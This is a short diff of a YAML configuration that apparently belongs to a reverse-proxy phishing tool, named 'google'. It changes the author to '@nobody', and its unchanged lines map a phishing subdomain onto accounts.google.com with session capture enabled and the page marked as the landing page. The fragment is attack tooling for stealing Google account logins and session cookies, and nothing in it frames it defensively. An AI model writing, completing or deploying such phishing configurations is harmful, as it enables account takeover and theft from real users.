@@ -1,5 +1,5 @@
 name: 'google'
-author: '@wilson'
+author: '@nobody'
 min_ver: '2.0.0'
 proxy_hosts:
   - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true}
